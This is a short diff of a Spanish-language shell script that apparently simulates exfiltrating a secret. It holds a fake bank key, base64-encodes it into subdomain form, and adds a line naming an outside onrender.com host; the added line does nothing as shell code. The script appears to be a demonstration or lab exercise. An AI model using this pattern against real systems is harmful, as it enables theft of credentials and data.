@@ -2,7 +2,7 @@
 
 # Simulación de un dato confidencial a exfiltrar (ej. un token o credencial)
 DATOS_SENSIBLES="clave_secreta_banco_2026"
-
+https://zero5-cadena-suministro-julian-valentina.onrender.com
 # Codificación del dato en Base64 para simular el formato de subdominio
 DATOS_CODIFICADOS=$(echo -n "$DATOS_SENSIBLES" | base64 | tr -d '=')
 
